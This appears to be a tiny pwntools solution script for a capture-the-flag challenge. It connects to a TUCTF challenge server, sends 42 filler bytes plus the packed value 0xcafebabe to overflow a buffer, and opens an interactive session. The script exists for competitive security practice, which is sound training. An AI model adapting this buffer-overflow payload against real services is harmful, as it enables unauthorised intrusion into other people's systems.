from pwn import *

# Start program
io = remote('chal.tuctf.com', 30011)

# Send string to overflow buffer
io.sendline(b'A' * 42 + p64(0xcafebabe))

# Receive output
io.interactive()